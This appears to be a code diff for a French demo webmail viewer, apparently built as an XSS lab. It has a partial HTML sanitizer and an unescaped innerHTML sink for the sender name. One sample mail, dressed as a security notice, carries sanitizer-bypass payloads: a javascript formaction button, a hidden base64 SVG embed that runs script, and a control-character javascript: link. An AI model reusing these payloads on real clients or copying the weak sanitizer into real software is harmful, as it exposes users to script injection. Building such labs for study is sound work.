+    "body_html": "<h1>Sortie cinéma</h1><p>Salut !</p><p>Ça te dirait d'aller au cinéma ce week-end? Il y a un film génial qui passe, <em>Les Aventuriers du Temps</em>, et ça a l'air vraiment super !</p><p>Fais-moi savoir si tu es partant·e.</p><p>A+<br>Carla</p>",
+    "body_text": "Salut !\n\nÇa te dirait d'aller au cinéma ce week-end? Il y a un film génial qui passe, 'Les Aventuriers du Temps', et ça a l'air super ! Fais-moi savoir si tu es partant·e.\n\nA+,\nCarla",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m4",
+    "from": { "name": "Alertes", "email": "alertes@bankeo.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Alerte : Nouvelle connexion à votre compte",
+    "date": "2025-10-31T22:05:00Z",
+    "snippet": "Nous avons détecté une connexion depuis un nouvel appareil. Si cela ne vous concerne pas, merci de vérifier vos informations.",
+    "body_html": "<h1>Alerte de sécurité</h1><p>Bonjour,</p><p>Nous avons détecté une <strong>connexion à votre compte bancaire</strong> depuis un nouvel appareil le <strong>31 octobre 2025</strong>. Si vous êtes à l'origine de cette connexion, vous n'avez aucune action à entreprendre.</p><p>Si ce n'est pas le cas, merci de vérifier immédiatement votre compte et de réinitialiser votre mot de passe. Nous vous recommandons également d'activer l'authentification à deux facteurs pour renforcer la sécurité de votre compte.</p><p>Cordialement,</p><p>L'équipe de sécurité</p>",
+    "body_text": "Bonjour,\n\nNous avons détecté une connexion à votre compte bancaire depuis un nouvel appareil le 31 octobre 2025. Si vous êtes à l'origine de cette connexion, aucune action n'est nécessaire.\n\nSi ce n'est pas le cas, merci de vérifier votre compte et de réinitialiser votre mot de passe. Nous vous recommandons également d'activer l'authentification à deux facteurs.\n\nCordialement,\nL'équipe de sécurité",
+    "attachments": [],
+    "flags": { "read": true, "important": true }
+  },
+  {
+    "id": "m5",
+    "from": { "name": "Travel", "email": "newsletter@travel-society.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Offre spéciale : -30% sur vos prochaines vacances",
+    "date": "2025-10-28T14:20:00Z",
+    "snippet": "Offre limitée : -30% sur vos prochaines réservations de voyage ! Découvrez nos destinations exclusives.",
+    "body_html": "<h1>Offre spéciale sur vos vacances</h1><p>Bonjour,</p><p>Nous avons une offre spéciale pour vous : <strong>-30% sur vos prochaines réservations de voyage</strong> ! Profitez de cette réduction pour visiter les destinations de vos rêves :</p><ul><li>Paris</li><li>Tokyo</li><li>New York</li><li>Barcelone</li></ul><p>Réservez dès maintenant sur notre site pour profiter de l'offre !</p><p>A très bientôt,</p><p>L'équipe Travel</p>",
+    "body_text": "Bonjour,\n\nNous avons une offre spéciale pour vous : -30% sur vos prochaines réservations de voyage ! Voici quelques destinations incluses dans cette offre : Paris, Tokyo, New York, et Barcelone.\n\nRéservez dès maintenant pour en profiter !\n\nA très bientôt,\nL'équipe Travel",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m6",
+    "from": { "name": "Julien", "email": "julien.moreno@cybersec.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Nouveau projet de collaboration ?",
+    "date": "2025-10-25T09:30:00Z",
+    "snippet": "Bonjour, j'aimerais discuter d'une nouvelle collaboration pour un projet à venir. Es-tu dispo cette semaine ?",
+    "body_html": "<h1>Projet de collaboration</h1><p>Bonjour,</p><p>Je t'écris pour te proposer de discuter d'un nouveau projet de collaboration qui pourrait nous intéresser tous les deux. Es-tu dispo cette semaine pour en parler ?</p><p>Fais-moi savoir tes créneaux disponibles.</p><p>A bientôt,</p><p>Julien</p>",
+    "body_text": "Bonjour,\n\nJe t'écris pour te proposer de discuter d'un nouveau projet de collaboration qui pourrait nous intéresser tous les deux. Es-tu dispo cette semaine pour en parler ?\n\nFais-moi savoir tes créneaux disponibles.\n\nA bientôt,\nJulien",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m7",
+    "from": { "name": "Forum Tech", "email": "admin@forumtech.org" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Votre inscription au forum a été validée",
+    "date": "2025-10-27T17:55:00Z",
+    "snippet": "Félicitations, vous êtes maintenant membre du forum Tech. Vous pouvez dès à présent participer aux discussions.",
+    "body_html": "<h1>Bienvenue sur le forum Tech</h1><p>Bonjour,</p><p>Nous sommes heureux de vous informer que votre inscription au <strong>forum Tech</strong> a été validée. Vous pouvez désormais participer aux discussions, poser des questions et partager vos connaissances avec les autres membres.</p><p>Nous vous invitons à consulter les <em>règles du forum</em> avant de commencer.</p><p>A bientôt sur le forum !</p><p>L'équipe du forum Tech</p>",
+    "body_text": "Bonjour,\n\nFélicitations, vous êtes maintenant membre du forum Tech. Vous pouvez dès à présent participer aux discussions, poser des questions et partager vos connaissances.\n\nNous vous invitons à consulter les règles du forum avant de commencer.\n\nA bientôt sur le forum,\nL'équipe du forum Tech",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m8",
+    "from": { "name": "Équipe Marketing", "email": "contact@marketingsolutions.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Lancement de notre nouvelle offre -50% sur le premier mois",
+    "date": "2025-10-26T11:00:00Z",
+    "snippet": "Offre exclusive pour nos abonnés ! Profitez de -50% sur le premier mois de notre service de marketing digital.",
+    "body_html": "<h1>Offre spéciale : -50% sur le premier mois</h1><p>Bonjour,</p><p>Nous sommes ravis de vous offrir une réduction de <strong>50%</strong> sur le premier mois de notre service de marketing digital.</p><p>Profitez de cette offre pour dynamiser la présence de votre entreprise en ligne !</p><p>Inscrivez-vous dès maintenant pour bénéficier de l'offre.</p><p>Cordialement,</p><p>L'équipe Marketing Solutions</p>",
+    "body_text": "Bonjour,\n\nNous sommes ravis de vous offrir une réduction de 50% sur le premier mois de notre service de marketing digital. Inscrivez-vous dès maintenant pour en profiter et dynamiser la présence de votre entreprise en ligne.\n\nCordialement,\nL'équipe Marketing Solutions",
+    "attachments": [],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m9",
+    "from": { "name": "Théodore Dupont", "email": "theodore.dupont@acme-cybersec.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Bienvenue — Formation Cybersécurité (23 octobre 2025)",
+    "date": "2025-10-20T09:15:00Z",
+    "snippet": "Bonjour, merci de vous être inscrit·e à la formation Cybersécurité du 23/10 — ordre du jour et lien de connexion ci-dessous.",
+    "body_html": "<p>Bonjour,</p><p>Merci de vous être inscrit·e à notre session <strong>Formation Cybersécurité — Niveau 1</strong> qui aura lieu le <strong>jeudi 23 octobre 2025 de 09:30 à 12:30</strong>.</p><p><strong>Ordre du jour :</strong><ul><li>09:30 — Accueil & présentation</li><li>09:45 — Menaces actuelles et bonnes pratiques</li><li>11:00 — Atelier pratique</li><li>12:15 — Questions / clôture</li></ul></p><p><strong>Lien de connexion (Zoom) :</strong><br><a href=\"https://zoom.acme-cybersec.com/j/987654321\">https://zoom.acme-cybersec.com/j/987654321</a></p><p>Si vous avez des questions avant la session, répondez simplement à cet email.</p><hr><p><strong>Théodore Dupont</strong><br>Formatrice — ACME Cybersecurity<br>Tél. +33 1 23 45 67 89<br><a href=\"https://acme-cybersec.com\">acme-cybersec.com</a></p><p style=\"font-size:0.9em;color:#666\">Vous recevez ce message car vous vous êtes inscrit·e à une formation ACME. Si vous ne souhaitez plus recevoir d'e‑mails, répondez « désabonner ».</p>",
+    "body_text": "Bonjour,\n\nMerci de vous être inscrit·e à notre session Formation Cybersécurité — Niveau 1 qui aura lieu le jeudi 23 octobre 2025 de 09:30 à 12:30.\n\nOrdre du jour :\n- 09:30 — Accueil & présentation\n- 09:45 — Menaces actuelles et bonnes pratiques\n- 11:00 — Atelier pratique\n- 12:15 — Questions / clôture\n\nLien de connexion (Zoom) : https://zoom.acme-cybersec.com/j/987654321\n\nSi vous avez des questions avant la session, répondez simplement à cet e‑mail.\n\nThéodore Dupont\nFormatrice — ACME Cybersecurity\nTél. +33 1 23 45 67 89\nacme-cybersec.com\n\nVous recevez ce message car vous vous êtes inscrit·e à une formation ACME. Pour vous désabonner, répondez « désabonner ». ",
+    "attachments": [
+      {
+        "filename": "agenda_formation_23oct.ics",
+        "size": 2048,
+        "type": "text/calendar",
+        "url": "https://acme-cybersec.com/calendar/AG-2025-10-23.ics"
+      }
+    ],
+    "flags": { "read": true, "important": false }
+  },
+  {
+    "id": "m10",
+    "from": { "name": "Service facturation", "email": "facturation@fournisseur-industrie.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Facture n° INV-2025-10-0423 — Octobre 2025",
+    "date": "2025-10-18T12:00:00Z",
+    "snippet": "Bonjour, veuillez trouver en pièce jointe la facture INV-2025-10-0423 relative à votre commande — paiement à 30 jours.",
+    "body_html": "<p>Bonjour,</p><p>Veuillez trouver ci-joint la facture <strong>INV-2025-10-0423</strong> correspondant à la prestation réalisée le 02/10/2025. Détails de paiement : <strong>30 jours fin de mois</strong>.</p><p><a href=\"https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf\">Télécharger la facture (PDF)</a></p><p>Si vous rencontrez un problème avec la facture, contactez notre service comptable : <a href=\"mailto:compta@fournisseur-industrie.fr\">compta@fournisseur-industrie.fr</a> / +33 1 98 76 54 32</p><hr><p>Bonne journée,<br>Service Facturation — Fournisseur Industrie</p>",
+    "body_text": "Bonjour,\n\nVeuillez trouver ci-joint la facture INV-2025-10-0423 correspondant à la prestation réalisée le 02/10/2025. Détails de paiement : 30 jours fin de mois.\n\nTélécharger la facture (PDF) : https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf\n\nPour toute question : compta@fournisseur-industrie.fr / +33 1 98 76 54 32\n\nBonne journée,\nService Facturation — Fournisseur Industrie",
+    "attachments": [
+      {
+        "filename": "INV-2025-10-0423.pdf",
+        "size": 123456,
+        "type": "application/pdf",
+        "url": "https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf"
+      }
+    ],
+    "flags": { "read": true, "important": true }
+  },
+  {
+    "id": "m11",
+    "from": { "name": "Support sécurité", "email": "security@plateforme-saas.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Action recommandée : vérifiez vos paramètres de sécurité",
+    "date": "2025-10-22T08:30:00Z",
+    "snippet": "Bonjour, par mesure de sécurité nous vous invitons à vérifier vos paramètres 2FA et l'activité récente sur votre compte.",
+    "body_html": "<p>Bonjour,</p><p>Par mesure de prévention, nous avons détecté une connexion inhabituelle sur votre compte le <strong>21 octobre 2025 à 23:12 (UTC)</strong>. Pour votre sécurité, merci de vérifier :</p><ul><li>Vos appareils connectés</li><li>La configuration de l'authentification à deux facteurs (2FA)</li><li>Les sessions actives</li></ul><p>Accédez à vos paramètres de sécurité ici : <a href=\"https://app.plateforme-saas.fr/account/security\">https://app.plateforme-saas.fr/account/security</a></p><p>Si vous n'êtes pas à l'origine de cette connexion, changez votre mot de passe immédiatement et contactez notre support : <a href=\"mailto:support@plateforme-saas.fr\">support@plateforme-saas.fr</a> / +33 1 55 44 33 22 (24/7).</p><p><img src=\"https://app.plateforme-saas.fr/assets/logo-small.png\" alt=\"logo\" style=\"width:120px\"></p><hr><p>Support Sécurité — Plateforme SaaS<br><a href=\"https://plateforme-saas.fr/help\">Centre d'aide</a></p>",
+    "body_text": "Bonjour,\n\nPar mesure de prévention, nous avons détecté une connexion inhabituelle sur votre compte le 21 octobre 2025 à 23:12 (UTC). Pour votre sécurité, merci de vérifier :\n- Vos appareils connectés\n- La configuration de l'authentification à deux facteurs (2FA)\n- Les sessions actives\n\nAccédez à vos paramètres de sécurité : https://app.plateforme-saas.fr/account/security\n\nSi vous n'êtes pas à l'origine de cette connexion, changez votre mot de passe immédiatement et contactez notre support : support@plateforme-saas.fr / +33 1 55 44 33 22 (24/7).\n\nSupport Sécurité — Plateforme SaaS\nCentre d'aide : https://plateforme-saas.fr/help",
+    "attachments": [],
+    "flags": { "read": true, "important": true }
+  }
+];
+let selectedId = null;
+
+function uid(prefix='m'){ return prefix + Math.random().toString(36).slice(2,9); }
+
+function formatDate(iso){
+  if(!iso) return '';
+  const d = new Date(iso);
+  if(isNaN(d)) return iso;
+  return d.toLocaleString();
+}
+
+function shortName(name, email){
+  if(name) return name;
+  if(email) return email.split('@')[0];
+  return '—';
+}
+
+function sanitizeHTML(html) {
+  const doc = new DOMParser().parseFromString(html || '', 'text/html');
+
+  ['script','style','iframe','object','link'].forEach(tag => {
+    doc.querySelectorAll(tag).forEach(n=>n.remove());
+  });
+
+  const walker = doc.createTreeWalker(doc.body, NodeFilter.SHOW_ELEMENT, null, false);
+  while(walker.nextNode()){
+    const el = walker.currentNode;
+    [...el.attributes].forEach(attr=>{
+      const name = attr.name.toLowerCase();
+      const val = attr.value || '';
+      if(name.startsWith('on')) el.removeAttribute(attr.name);
+      if((name==='href' || name==='src') && val.trim().toLowerCase().startsWith('javascript:')) el.removeAttribute(attr.name);
+      if((name==='href' || name==='src') && val.trim().toLowerCase().startsWith('data:') && !val.trim().toLowerCase().startsWith('data:image')) {
+        el.removeAttribute(attr.name);
+      }
+      if(name==='srcdoc') el.removeAttribute(attr.name);
+    });
+  }
+
+  return doc.body.innerHTML;
+}
+
+const listEl = document.getElementById('mail-list');
+const viewSubject = document.getElementById('view-subject');
+const viewFrom = document.getElementById('view-from');
+const viewDate = document.getElementById('view-date');
+const viewAvatar = document.getElementById('view-avatar');
+const mailBody = document.getElementById('mail-body');
+const attachmentsEl = document.getElementById('attachments');
+const plainBodyEl = document.getElementById('plain-body');
+const rawPanel = document.getElementById('raw-panel');
+const rawContent = document.getElementById('raw-content');
+const fullHeaders = document.getElementById('full-headers');
+
+function renderList(filter=''){
+  const q = (document.getElementById('search').value || '').toLowerCase();
+  const sort = document.getElementById('sort').value;
+  let arr = mails.slice();
+
+  if(q){
+    arr = arr.filter(m=>{
+      return (m.subject||'').toLowerCase().includes(q) ||
+             (m.body_text||'').toLowerCase().includes(q) ||
+             (m.body_html||'').toLowerCase().includes(q) ||
+             (m.from?.name||'').toLowerCase().includes(q) ||
+             (m.from?.email||'').toLowerCase().includes(q);
+    });
+  }
+
+  if(sort==='date_desc') arr.sort((a,b)=> new Date(b.date) - new Date(a.date));
+  else if(sort==='date_asc') arr.sort((a,b)=> new Date(a.date) - new Date(b.date));
+  else if(sort==='from_asc') arr.sort((a,b)=> (a.from?.name||a.from?.email||'').localeCompare(b.from?.name||b.from?.email||''));
+
+  listEl.innerHTML = '';
+  arr.forEach(m=>{
+    const item = document.createElement('div');
+    item.className = 'mail-item';
+    item.title = `${m.from.name} <${m.from.email}>`;
+    item.dataset.id = m.id;
+    if(selectedId === m.id){
+      item.style.outline = '2px solid rgba(14,165,161,0.12)';
+    }
+
+    const avatar = document.createElement('div');
+    avatar.className = 'avatar';
+    avatar.textContent = (m.from?.name || m.from?.email || 'U').slice(0,2).toUpperCase();
+
+    const meta = document.createElement('div');
+    meta.className = 'meta';
+    const left = document.createElement('div');
+    left.className = 'meta-left';
+    const subj = document.createElement('div');
+    subj.className = 'subject';
+    subj.textContent = m.subject || '(sans objet)';
+    if(!m.flags?.read) subj.style.fontWeight = 700;
+    const snippet = document.createElement('div');
+    snippet.className = 'snippet';
+    snippet.textContent = m.snippet || (m.body_text||'').slice(0,120);
+
+    left.appendChild(subj);
+    left.appendChild(snippet);
+
+    const right = document.createElement('div');
+    right.style.display='flex';
+    right.style.flexDirection='column';
+    right.style.alignItems='flex-end';
+    right.style.justifyContent='space-between';
+    const time = document.createElement('div');
+    time.className = 'time';
+    time.textContent = formatDate(m.date);
+    const badges = document.createElement('div');
+    badges.className = 'badges';
+    if(m.flags?.important) badges.innerHTML += '<span class="badge" style="background:#fff7ed;color:#b45309">Important</span>';
+    if(!m.flags?.read) badges.innerHTML += '<span class="badge">Non lu</span>';
+    right.appendChild(time);
+    right.appendChild(badges);
+
+    meta.appendChild(left);
+    meta.appendChild(right);
+
+    item.appendChild(avatar);
+    item.appendChild(meta);
+
+    item.addEventListener('click', ()=> selectMail(m.id));
+
+    listEl.appendChild(item);
+  });
+
+  document.getElementById('count-inbox').textContent = mails.length;
+  document.getElementById('count-unread').textContent = mails.filter(m=>!m.flags?.read).length;
+  document.getElementById('count-important').textContent = mails.filter(m=>m.flags?.important).length;
+}
+
+function selectMail(id){
+  selectedId = id;
+  const m = mails.find(x=>x.id===id);
+  if(!m) return;
+
+  m.flags = m.flags || {};
+  m.flags.read = true;
+  renderList();
+  
+  document.getElementById('viewer').style.display = 'flex';
+
+  viewSubject.textContent = m.subject || '(sans objet)';
+  viewFrom.innerHTML = `${m.from?.name ? `${m.from.name}` : ''} <span style="color:var(--muted)">&lt;${m.from?.email||''}&gt;</span>`;
+  viewAvatar.textContent = (m.from?.name || m.from?.email || 'U').slice(0,2).toUpperCase();
+  viewDate.textContent = formatDate(m.date);
+
+  fullHeaders.style.display='block';
+  fullHeaders.textContent = `
+De: ${((m.from?.name || '') + ((' <' + m.from?.email + '>') || ' <>')).padEnd(35)} Attachements: ${m.attachments?.length || 0}
+À: ${((m.to || []).map(t=> (t.name? t.name+' ': '') + '<'+t.email+'>').join(', ')).padEnd(36)} Date: ${m.date || ''}
+Sujet: ${m.subject}`;
+
+  if(m.body_html){
+    const safe = sanitizeHTML(m.body_html);
+    mailBody.innerHTML = safe;
+  } else {
+    mailBody.innerHTML = '<div class="small" style="color:var(--muted)">Pas de contenu HTML</div>';
+  }
+
+  attachmentsEl.innerHTML = '';
+  (m.attachments||[]).forEach(a=>{
+    const el = document.createElement('div');
+    el.className = 'attach';
+    el.textContent = `${a.filename || 'fichier'} (${Math.round((a.size||0)/1024)} KB)`;
+    attachmentsEl.appendChild(el);
+  });
+
+  plainBodyEl.textContent = m.body_text || '';
+  rawPanel.style.display = 'none';
+  rawContent.textContent = JSON.stringify(m, null, 2);
+}
+
+function toggleReadForSelected(){
+  if(!selectedId) return alert('Sélectionner un message d’abord');
+  const m = mails.find(x=>x.id===selectedId);
+  m.flags = m.flags || {};
+  m.flags.read = !m.flags.read;
+  renderList();
+  selectMail(selectedId);
+}
+
+function toggleImportantForSelected(){
+  if(!selectedId) return alert('Sélectionner un message d’abord');
+  const m = mails.find(x=>x.id===selectedId);
+  m.flags = m.flags || {};
+  m.flags.important = !m.flags.important;
+  renderList();
+  selectMail(selectedId);
+}
+
+document.getElementById('load-json').addEventListener('click', ()=>{
+  const txt = document.getElementById('json-input').value.trim();
+  if(!txt) return alert('Colle un JSON de mails dans la zone ci‑dessous.');
+  try{
+    const arr = JSON.parse(txt);
+    if(!Array.isArray(arr)) throw new Error('Le JSON doit être un tableau de messages');
+
+    arr.forEach(m=>{ if(!m.id) m.id = uid(); if(!m.flags) m.flags = {}; });
+    mails = arr;
+    selectedId = null;
+    renderList();
+    alert('Mails chargés : ' + mails.length);
+  }catch(e){
+    alert('Erreur JSON: ' + e.message);
+  }
+});
+
+document.getElementById('clear-json').addEventListener('click', ()=>{
+  document.getElementById('json-input').value = '';
+});
+
+document.getElementById('sample-json').addEventListener('click', ()=>{
+  const sample = [
+  {
+    "id": "m1",
+    "from": { "name": "Théodore Dupont", "email": "alice.dupont@acme-cybersec.com" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Bienvenue — Formation Cybersécurité (23 octobre 2025)",
+    "date": "2025-10-20T09:15:00Z",
+    "snippet": "Bonjour, merci de vous être inscrit·e à la formation Cybersécurité du 23/10 — ordre du jour et lien de connexion ci-dessous.",
+    "body_html": "<p>Bonjour,</p><p>Merci de vous être inscrit·e à notre session <strong>Formation Cybersécurité — Niveau 1</strong> qui aura lieu le <strong>jeudi 23 octobre 2025 de 09:30 à 12:30</strong>.</p><p><strong>Ordre du jour :</strong><ul><li>09:30 — Accueil & présentation</li><li>09:45 — Menaces actuelles et bonnes pratiques</li><li>11:00 — Atelier pratique</li><li>12:15 — Questions / clôture</li></ul></p><p><strong>Lien de connexion (Zoom) :</strong><br><a href=\"https://zoom.acme-cybersec.com/j/987654321\">https://zoom.acme-cybersec.com/j/987654321</a></p><p>Si vous avez des questions avant la session, répondez simplement à cet email.</p><hr><p><strong>Théodore Dupont</strong><br>Formatrice — ACME Cybersecurity<br>Tél. +33 1 23 45 67 89<br><a href=\"https://acme-cybersec.com\">acme-cybersec.com</a></p><p style=\"font-size:0.9em;color:#666\">Vous recevez ce message car vous vous êtes inscrit·e à une formation ACME. Si vous ne souhaitez plus recevoir d'e‑mails, répondez « désabonner ».</p>",
+    "body_text": "Bonjour,\n\nMerci de vous être inscrit·e à notre session Formation Cybersécurité — Niveau 1 qui aura lieu le jeudi 23 octobre 2025 de 09:30 à 12:30.\n\nOrdre du jour :\n- 09:30 — Accueil & présentation\n- 09:45 — Menaces actuelles et bonnes pratiques\n- 11:00 — Atelier pratique\n- 12:15 — Questions / clôture\n\nLien de connexion (Zoom) : https://zoom.acme-cybersec.com/j/987654321\n\nSi vous avez des questions avant la session, répondez simplement à cet e‑mail.\n\nThéodore Dupont\nFormatrice — ACME Cybersecurity\nTél. +33 1 23 45 67 89\nacme-cybersec.com\n\nVous recevez ce message car vous vous êtes inscrit·e à une formation ACME. Pour vous désabonner, répondez « désabonner ». ",
+    "attachments": [
+      {
+        "filename": "agenda_formation_23oct.ics",
+        "size": 2048,
+        "type": "text/calendar",
+        "url": "https://acme-cybersec.com/calendar/AG-2025-10-23.ics"
+      }
+    ],
+    "flags": { "read": false, "important": false }
+  },
+  {
+    "id": "m2",
+    "from": { "name": "Service facturation — Fournisseur Industrie", "email": "facturation@fournisseur-industrie.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Facture n° INV-2025-10-0423 — Octobre 2025",
+    "date": "2025-10-18T12:00:00Z",
+    "snippet": "Bonjour, veuillez trouver en pièce jointe la facture INV-2025-10-0423 relative à votre commande — paiement à 30 jours.",
+    "body_html": "<p>Bonjour,</p><p>Veuillez trouver ci-joint la facture <strong>INV-2025-10-0423</strong> correspondant à la prestation réalisée le 02/10/2025. Détails de paiement : <strong>30 jours fin de mois</strong>.</p><p><a href=\"https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf\">Télécharger la facture (PDF)</a></p><p>Si vous rencontrez un problème avec la facture, contactez notre service comptable : <a href=\"mailto:compta@fournisseur-industrie.fr\">compta@fournisseur-industrie.fr</a> / +33 1 98 76 54 32</p><hr><p>Bonne journée,<br>Service Facturation — Fournisseur Industrie</p>",
+    "body_text": "Bonjour,\n\nVeuillez trouver ci-joint la facture INV-2025-10-0423 correspondant à la prestation réalisée le 02/10/2025. Détails de paiement : 30 jours fin de mois.\n\nTélécharger la facture (PDF) : https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf\n\nPour toute question : compta@fournisseur-industrie.fr / +33 1 98 76 54 32\n\nBonne journée,\nService Facturation — Fournisseur Industrie",
+    "attachments": [
+      {
+        "filename": "INV-2025-10-0423.pdf",
+        "size": 123456,
+        "type": "application/pdf",
+        "url": "https://invoices.fournisseur-industrie.fr/download/INV-2025-10-0423.pdf"
+      }
+    ],
+    "flags": { "read": true, "important": true }
+  },
+  {
+    "id": "m3",
+    "from": { "name": "Plateforme SaaS — Support sécurité", "email": "security@plateforme-saas.fr" },
+    "to": [{ "name": "Vous", "email": "mauricelambert434@mailbox.fr" }],
+    "subject": "Action recommandée : vérifiez vos paramètres de sécurité",
+    "date": "2025-10-22T08:30:00Z",
+    "snippet": "Bonjour, par mesure de sécurité nous vous invitons à vérifier vos paramètres 2FA et l'activité récente sur votre compte.",
+    "body_html": "<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form><EMBED style='display: none;' SRC='data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==' type='image/svg+xml' AllowScriptAccess='always'></EMBED><a href='\x07javascript:alert(1)'>Click Me</a><p>Bonjour,</p><p>Par mesure de prévention, nous avons détecté une connexion inhabituelle sur votre compte le <strong>21 octobre 2025 à 23:12 (UTC)</strong>. Pour votre sécurité, merci de vérifier :</p><ul><li>Vos appareils connectés</li><li>La configuration de l'authentification à deux facteurs (2FA)</li><li>Les sessions actives</li></ul><p>Accédez à vos paramètres de sécurité ici : <a href=\"https://app.plateforme-saas.fr/account/security\">https://app.plateforme-saas.fr/account/security</a></p><p>Si vous n'êtes pas à l'origine de cette connexion, changez votre mot de passe immédiatement et contactez notre support : <a href=\"mailto:support@plateforme-saas.fr\">support@plateforme-saas.fr</a> / +33 1 55 44 33 22 (24/7).</p><p><img src=\"https://app.plateforme-saas.fr/assets/logo-small.png\" alt=\"logo\" style=\"width:120px\"></p><hr><p>Support Sécurité — Plateforme SaaS<br><a href=\"https://plateforme-saas.fr/help\">Centre d'aide</a></p>",
+    "body_text": "Bonjour,\n\nPar mesure de prévention, nous avons détecté une connexion inhabituelle sur votre compte le 21 octobre 2025 à 23:12 (UTC). Pour votre sécurité, merci de vérifier :\n- Vos appareils connectés\n- La configuration de l'authentification à deux facteurs (2FA)\n- Les sessions actives\n\nAccédez à vos paramètres de sécurité : https://app.plateforme-saas.fr/account/security\n\nSi vous n'êtes pas à l'origine de cette connexion, changez votre mot de passe immédiatement et contactez notre support : support@plateforme-saas.fr / +33 1 55 44 33 22 (24/7).\n\nSupport Sécurité — Plateforme SaaS\nCentre d'aide : https://plateforme-saas.fr/help",
+    "attachments": [],
+    "flags": { "read": false, "important": true }
+  }
+];
+  document.getElementById('json-input').value = JSON.stringify(sample, null, 2);
+});
+
+document.getElementById('export-json').addEventListener('click', ()=>{
+  const data = JSON.stringify(mails, null, 2);
+  const blob = new Blob([data], {type:'application/json'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'inbox-export.json'; document.body.appendChild(a); a.click();
+  a.remove(); URL.revokeObjectURL(url);
+});
+
+document.getElementById('import-file').addEventListener('change', (ev)=>{
+  const f = ev.target.files[0];
+  if(!f) return;
+  const reader = new FileReader();
+  reader.onload = (e)=>{
+    try{
+      const arr = JSON.parse(e.target.result);
+      if(!Array.isArray(arr)) return alert('Le fichier JSON doit contenir un tableau de messages');
+      arr.forEach(m=>{ if(!m.id) m.id = uid(); if(!m.flags) m.flags = {}; });
+      mails = arr;
+      selectedId = null;
+      renderList();
+      alert('Mails importés: '+mails.length);
+    }catch(err){
+      alert('Erreur lecture fichier: ' + err.message);
+    }
+  };
+  reader.readAsText(f);
+});
+
+document.getElementById('search').addEventListener('input', ()=> renderList());
+document.getElementById('clear-search').addEventListener('click', ()=>{ document.getElementById('search').value=''; renderList(); });
+document.getElementById('sort').addEventListener('change', ()=> renderList());
+
+document.getElementById('mark-all-read').addEventListener('click', ()=>{
+  mails.forEach(m=>{ m.flags = m.flags || {}; m.flags.read = true; });
+  renderList();
+});
+
+document.getElementById('toggle-read').addEventListener('click', toggleReadForSelected);
+document.getElementById('toggle-important').addEventListener('click', toggleImportantForSelected);
+document.getElementById('view-raw').addEventListener('click', ()=>{
+  if(!selectedId) return alert('Sélectionner un message d’abord');
+  rawPanel.style.display = rawPanel.style.display === 'none' ? 'block' : 'none';
+  rawContent.textContent = JSON.stringify(mails.find(x=>x.id===selectedId), null, 2);
+});
+
+document.getElementById('new-mail').addEventListener('click', ()=>{
+  const subj = prompt('Sujet du mail :', 'Nouveau message de démonstration');
+  if(subj === null) return;
+  const from = prompt('Expéditeur (nom <email>) :', 'demo@example.com');
+  const body = prompt('HTML du message (balises autorisées) :', '<p>Corps du message</p>');
+  const m = {
+    id: uid(),
+    from: { name: from.split('<')[0].trim(), email: (from.match(/<(.+)>/) || [,'demo@example.com'])[1]},
+    to: [{name:'Vous', email:'mauricelambert434@mailbox.fr'}],
+    subject: subj,
+    date: new Date().toISOString(),
+    snippet: (body||'').replace(/<[^>]*>/g,'').slice(0,120),
+    body_html: body,
+    body_text: (body||'').replace(/<[^>]*>/g,''),
+    attachments: [],
+    flags: {read:false, important:false}
+  };
+  mails.unshift(m);
+  renderList();
+});
+
+document.getElementById('import-file').addEventListener('click', ()=> document.getElementById('import-file').value = '');
+
+document.getElementById('toggle-theme').addEventListener('click', (ev)=>{
+  const b = document.body;
+  if(b.dataset.theme === 'dark'){
+    b.dataset.theme = 'light';
+    b.style.background = 'linear-gradient(180deg,#f7fafc, #eef2ff 60%)';
+    ev.target.textContent = 'Clair';
+  } else {
+    b.dataset.theme = 'dark';
+    b.style.background = 'linear-gradient(180deg,#0b1020, #071431 60%)';
+    document.querySelectorAll('.card, .sidebar, .mail-list, .viewer').forEach(n=>{
+    });
+    ev.target.textContent = 'Sombre';
+  }
+});
+
+renderList();
+
+window.addEventListener('keydown', (e)=>{
+  if(e.key==='n' && (e.ctrlKey || e.metaKey)){ e.preventDefault(); document.getElementById('new-mail').click(); }
